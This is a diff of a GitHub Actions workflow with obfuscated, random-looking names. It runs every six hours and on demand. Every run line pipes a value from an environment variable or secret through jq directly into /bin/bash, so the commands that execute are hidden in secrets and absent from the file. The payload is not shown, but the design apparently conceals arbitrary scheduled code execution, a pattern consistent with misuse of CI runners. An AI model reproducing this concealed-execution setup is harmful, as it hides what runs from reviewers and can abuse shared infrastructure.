@@ -1,8 +1,9 @@
 name: xiaozhumei5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
+    - cron: '38 1/6 * * *'
 
 jobs:
   build:
@@ -12,16 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiaozhumei5678
         env:
-          xu4112: ${{ secrets.xu4112 }}
+          nit923: ${{ secrets.nit923 }}
         run: |
-          echo $xu4112 | jq -r .kh3697 | /bin/bash
-          echo $sauih7 | jq -r .zhf2 | /bin/bash
-          echo $gzr64798 | jq -r .r6 | /bin/bash
-          echo $uritv7 | jq -r .szh167 | /bin/bash
-          echo $lq0837 | jq -r .e6 | /bin/bash
-          echo $g3869 | jq -r .eqto95 | /bin/bash
-          echo $tnbsr55633 | jq -r .k3570 | /bin/bash
-          echo $mavqw67619 | jq -r .dvl2415 | /bin/bash
-          echo $jgm913 | jq -r .lnz5922 | /bin/bash
-          echo $xw94409 | jq -r .sxikr41 | /bin/bash
+          echo $nit923 | jq -r .zxtud75 | /bin/bash
+          echo $o5035 | jq -r .wqar79512 | /bin/bash
+          echo $wnjm2272 | jq -r .me6382 | /bin/bash
+          echo $w6578 | jq -r .okhq90836 | /bin/bash
+          echo $ch84433 | jq -r .q43591 | /bin/bash
+          echo $ey81353 | jq -r .h94672 | /bin/bash
+          echo $qkw2907 | jq -r .xiki6 | /bin/bash
+          echo $kr99 | jq -r .qufq21038 | /bin/bash
+          echo $eb8 | jq -r .lz20 | /bin/bash
+          echo $avkkw667 | jq -r .yact9522 | /bin/bash
+          echo $j8 | jq -r .zdqc003 | /bin/bash
 
